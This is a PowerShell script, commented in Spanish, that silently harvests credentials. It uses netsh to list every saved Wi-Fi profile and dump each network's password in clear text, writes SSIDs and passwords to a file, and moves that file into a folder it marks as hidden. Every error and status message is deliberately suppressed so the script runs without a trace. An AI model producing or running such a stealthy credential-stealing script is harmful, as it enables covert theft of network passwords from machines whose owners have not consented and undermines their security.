# --- Configuración ---
$outputFile = "wpsd.txt"
$outputFolder = "invisible"
# Obtener la ruta del directorio donde se está ejecutando el script
$scriptDirectory = $PSScriptRoot # Variable automática que contiene la ruta del script
$outputFilePath = Join-Path -Path $scriptDirectory -ChildPath $outputFile
$outputFolderPath = Join-Path -Path $scriptDirectory -ChildPath $outputFolder

# --- Limpiar archivo de salida anterior si existe ---
if (Test-Path $outputFilePath) {
    Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue # Suprimir errores si no se puede borrar
}

# --- Obtener perfiles Wi-Fi y contraseñas ---
# No mostrar mensaje inicial

# Ejecutar netsh para obtener los perfiles
# Suprimir errores si netsh falla (ej. no se encuentra, permisos)
$profilesOutput = (netsh wlan show profiles 2>$null)

# Filtrar las líneas que contienen los nombres de perfil
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }

if (-not $profileLines) {
    # No mostrar advertencia si no hay perfiles
} else {
    # --- Iterar sobre cada perfil encontrado ---
    foreach ($line in $profileLines) {
        # Extraer el nombre del perfil
        $profileName = ($line -split ':', 2)[1].Trim()

        # Inicializar la contraseña
        $password = "[No encontrada o no aplicable]"

        # Obtener los detalles del perfil, incluyendo la clave en texto claro
        try {
            # Suprimir errores si netsh falla para un perfil específico
            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)

            # Buscar la línea que contiene la contraseña
            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }

            if ($keyLine) {
                # Extraer la contraseña
                $password = ($keyLine -split ':', 2)[1].Trim()
            } else {
                # No mostrar advertencia si no se encuentra contraseña
            }
        } catch {
            # No mostrar advertencia si hay error al obtener detalles
            # Continuar con el siguiente perfil en caso de error
            continue
        }

        # --- Añadir la información al archivo de salida ---
        # Suprimir errores si falla la escritura
        try {
            Add-Content -Path $outputFilePath -Value "SSID: $profileName" -ErrorAction Stop
            Add-Content -Path $outputFilePath -Value "PWD: $password" -ErrorAction Stop
            Add-Content -Path $outputFilePath -Value "-----------------------------------------" -ErrorAction Stop
        } catch {
             # No mostrar error si falla la escritura al archivo
        }
        # No mostrar mensaje de perfil procesado
    }
}

# --- Crear carpeta oculta ---
# No mostrar mensaje de creación

try {
    # Crear el directorio si no existe, suprimir salida normal y errores
    if (-not (Test-Path -Path $outputFolderPath -PathType Container)) {
        New-Item -Path $outputFolderPath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    # Obtener el objeto de la carpeta y establecer el atributo oculto, suprimir errores
    $folderItem = Get-Item -Path $outputFolderPath -Force -ErrorAction SilentlyContinue
    if ($folderItem -and (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden)) {
         $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
    # No mostrar mensaje de éxito
} catch {
    # No mostrar error si falla la creación/ocultación
}

# --- Mover el archivo de salida a la carpeta oculta ---
if (Test-Path $outputFilePath) {
    # No mostrar mensaje de movimiento
    try {
        Move-Item -Path $outputFilePath -Destination $outputFolderPath -Force -ErrorAction SilentlyContinue
        # No mostrar mensaje de éxito
    } catch {
         # No mostrar error si falla el movimiento
    }
} else {
    # No mostrar advertencia si el archivo no se encontró
}

# No mostrar mensaje final
# El script termina silenciosamente
